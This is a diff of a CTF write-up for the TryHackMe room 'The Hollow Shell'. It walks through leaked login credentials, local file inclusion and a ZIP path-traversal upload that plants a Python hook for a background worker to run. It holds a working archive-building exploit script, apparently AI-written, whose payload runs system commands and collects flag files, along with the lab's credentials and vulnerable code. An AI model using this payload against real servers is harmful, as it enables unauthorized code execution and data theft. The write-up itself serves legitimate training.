@@ -11,29 +11,37 @@ toc = true
 image = 'images/room-banner.png'
 +++
 
-Welcome to my writeup for the TryHackMe room **The Hollow Shell**. This one was a web challenge on a non-standard port, with a login page, an upload flow, and enough weird file handling to make the actual path to code execution feel like a small maze.
+Welcome to my writeup for the TryHackMe room **The Hollow Shell**. This room took me much longer than I expected, mainly because I spent a lot of time testing the upload form before I understood how the application handled uploaded files in the background.
 
-> **Spoiler warning:** This walkthrough reveals the room's solution path and the final flag, but the flag itself is masked.
+> **Spoiler warning:** This walkthrough reveals the room's solution path. The final flag is masked.
 
 ![The Hollow Shell room banner](images/room-banner.png)
 
-## Getting In
+## Finding the Web Application
 
-The room exposed a URL on **port 5000** instead of the usual port 80, so the first thing I did was open the site directly on that port.
+The room provided a target URL, but the web application was running on port `5000` rather than the usual HTTP port `80`. A quick Nmap scan confirmed that port `5000` was open.
 
 ![Nmap scan showing the web service open on port 5000](images/nmap-port-scan.png)
 
-The page presented a login form. The source code of the login page gave away the credentials, so there was no need to brute-force anything.
+I opened the site by adding the port to the target address:
+
+```text
+http://TARGET_IP:5000
+```
+
+The page displayed a staff login form.
 
 ![Byte Lotus staff sign-in page](images/staff-login.png)
 
-Viewing the page source revealed the staff username and passphrase in an HTML comment.
+Before trying to guess or brute-force the credentials, I checked the page source. The username and password had been left inside an HTML comment.
 
-![Login page source revealing the hardcoded staff credentials](images/login-source-credentials.png)
+![Login page source revealing the staff credentials](images/login-source-credentials.png)
 
-Once logged in, the application showed an upload form for a shell package. The upload accepted a ZIP archive with a `shell.json` manifest in this format:
+Using those credentials gave me access to the room's shell upload page.
 
-![Authenticated shell upload page with the archive requirements](images/shell-upload-page.png)
+## Investigating the Upload Form
+
+The application accepted a ZIP file containing a `shell.json` manifest. The expected format was:
 
 ```json
 {
@@ -43,99 +51,47 @@ Once logged in, the application showed an upload form for a shell package. The u
 }
 ```
 
-At first I tried to abuse the allowed file extensions. I managed to get code execution in an `.svg` file, but that did not lead anywhere useful. That dead end suggested the interesting behavior was not in the static asset handling itself.
+![Authenticated shell upload page showing the archive requirements](images/shell-upload-page.png)
 
-## Looking For A Better Angle
+I spent a lot of time testing the file extensions allowed by the uploader. I managed to make code inside an SVG execute when the file was rendered, but that did not lead to the flag. It was a dead end.
 
-The hint that eventually mattered was local file inclusion. I used the upload path and traversal tricks to look for readable application files, which exposed the Flask app and the background worker:
+At that point, people in the TryHackMe Discord server were hinting at **local file inclusion (LFI)**. Following that hint, I changed direction and started looking for application source files.
+
+## Finding the Application Source
+
+Using LFI, I found two important Python files:
 
 ```text
 app.py
-```
-
-```text
 theme_worker.py
 ```
 
-Fetching them through LFI was the turning point.
+These files explained how the upload feature worked. The application extracted the contents of an uploaded ZIP, while `theme_worker.py` processed Python files placed in the `hooks` directory.
 
-The main app logic showed three important details:
+The important weakness was that a ZIP entry could use `../` sequences to escape its intended extraction directory. If I added a file named `../../hooks/pwn.py` to the archive, the application would write it into the directory monitored by the worker.
 
-- the login credentials were hardcoded in `app.py`;
-- uploads were extracted from a ZIP archive into a shell directory;
-- the app accepted a `shell.json` manifest, but it only validated the declared asset list, not the entire archive content.
+That turned the upload into a path to server-side Python execution.
 
-The extracted code looked like this:
+## Building the Malicious ZIP
 
-```python
-STAFF_USER = "concierge"
-STAFF_PASS = "StayNoticed2024!"
-```
-
-That explained the login bypass immediately.
-
-## Why The Upload Was Dangerous
-
-The more interesting bug was in the ZIP extraction logic. The app trusted the archive names and wrote each file straight to disk:
+I used the following script to build the archive. DeepSeek wrote the script for me after I worked out that the ZIP needed to place a Python file in the hooks directory.
 
 ```python
-for name in zf.namelist():
-    if name.endswith("/"):
-        continue
-    dest = os.path.join(shell_dir, name)
-    os.makedirs(os.path.dirname(dest), exist_ok=True)
-    with open(dest, "wb") as fh:
-        fh.write(zf.read(name))
-```
+import zipfile, json
 
-That means a crafted archive could escape the intended shell directory by using path traversal in the filename.
+payload = r'''
+import os, glob, stat
 
-The worker process was even better for an attacker. It watched the `hooks` directory and executed any Python file it found there:
-
-```python
-for path in sorted(glob.glob(os.path.join(HOOKS_DIR, "*.py"))):
-    with open(path, "rb") as fh:
-        code = fh.read()
-    os.remove(path)
-    proc = subprocess.Popen(
-        [sys.executable, "-"],
-        stdin=subprocess.PIPE,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-    proc.stdin.write(code)
-    proc.stdin.close()
-```
-
-That gave me the real exploit path:
-
-- upload a ZIP archive;
-- abuse path traversal to write a Python hook into the server's `hooks` directory;
-- wait for the worker to pick it up and run it;
-- have the payload write output into a web-accessible location under `shells/`.
-
-## Building The Payload
-
-My payload did two jobs: it gathered basic system information and searched for flag files, then wrote the results to a file I could fetch back over HTTP.
-
-The archive content was structured so the traversal landed in the hooks directory. The manifest stayed valid because the app only checked the JSON shape and the declared asset extensions.
-
-![Application confirmation after accepting the crafted shell archive](images/upload-confirmation.png)
-
-A simplified version of the payload looked like this:
-
-```python
-import os
-import glob
-import stat
-
+# Find the application base directory (where theme_worker.py lives)
 base = os.path.dirname(
     next(iter(glob.glob('/**/theme_worker.py', recursive=True)), '/app')
 )
 
+# Create an output directory that's web-accessible
 out_dir = os.path.join(base, 'shells', 'pwn')
 os.makedirs(out_dir, exist_ok=True)
 
+# Gather system info and flag contents
 out_path = os.path.join(out_dir, 'out.txt')
 with open(out_path, 'w') as f:
     f.write(f"id: {os.popen('id').read().strip()}\n")
@@ -150,59 +106,67 @@ with open(out_path, 'w') as f:
         except Exception as e:
             f.write(f"[error] {e}\n")
 
+# Make it readable
 os.chmod(out_dir, stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)
 os.chmod(out_path, stat.S_IRUSR | stat.S_IRGRP | stat.S_IROTH)
+'''
+
+with zipfile.ZipFile('hook.zip', 'w') as z:
+    z.writestr('shell.json', json.dumps({"name": "x", "assets": []}))
+    z.writestr('../../hooks/pwn.py', payload)
+
+print("built hook.zip")
 ```
 
-After uploading the ZIP, the worker executed the hook, and the output appeared at:
+The archive contained two files:
+
+```text
+shell.json
+../../hooks/pwn.py
+```
+
+The manifest was enough to satisfy the uploader, while the second filename used path traversal to place `pwn.py` in the hooks directory.
+
+I ran the script to create `hook.zip` and uploaded the resulting archive.
+
+![Application confirmation after accepting the crafted shell archive](images/upload-confirmation.png)
+
+## Retrieving the Flag
+
+After the upload, the background worker found and executed `pwn.py`. The payload searched the server for files beginning with `flag` and wrote anything it found to a web-accessible output file.
+
+I opened the following path in the browser:
 
 ```text
 /shells/pwn/out.txt
 ```
 
-Opening that file in the browser gave me the flag.
+The flag was waiting there:
 
 ```text
 THM{[REDACTED]}
 ```
 
-## Why The Exploit Worked
+## Final Thoughts
 
-The weakness here was a combination of several smaller problems:
-
-- the login secret was exposed in source code;
-- the archive extraction trusted ZIP entry names;
-- the worker executed Python files from a writable directory;
-- the payload could write into a web-accessible path.
-
-In practice, that meant a low-friction chain from disclosure to authentication bypass to arbitrary code execution.
+The complete path was:
 
 ```text
-Leaked credentials
-      ↓
-Authenticated access
-      ↓
-ZIP upload with traversal
-      ↓
-Hook written to hooks/
-      ↓
-Worker executes Python payload
-      ↓
-Flag written to shells/pwn/out.txt
+Credentials in page source
+          ↓
+Authenticated ZIP upload
+          ↓
+LFI reveals app.py and theme_worker.py
+          ↓
+ZIP path traversal writes ../../hooks/pwn.py
+          ↓
+Background worker executes the payload
+          ↓
+Flag is written to /shells/pwn/out.txt
 ```
 
-## Takeaways
+This room really took a long time. The SVG route looked promising at first, and I probably stayed with it longer than I should have. Finding the application source through LFI was the turning point because it showed that the real vulnerability was not an allowed file extension—it was how the server extracted the archive and processed hooks afterward.
 
-This room was a good reminder that file upload issues often hide in the glue code around the upload rather than in the file type itself.
-
-The useful habits here were:
-
-- check for source disclosure when a web app feels too convenient;
-- inspect server-side extraction logic for path traversal;
-- treat background workers as part of the attack surface;
-- look for a writeable path that is also web-accessible;
-- do not stop after a dead end like the SVG code execution path if there is still unexplained server-side behavior.
-
-The key lesson is that upload validation only helps if the server actually constrains where files land and what gets executed afterward. Once I found the worker, the room stopped being about file types and became about control of the server's file system.
+I also have to thank the TryHackMe Discord server. Their LFI hints helped me get unstuck and pointed me toward the part of the application I needed to investigate.
 
 And we're done!
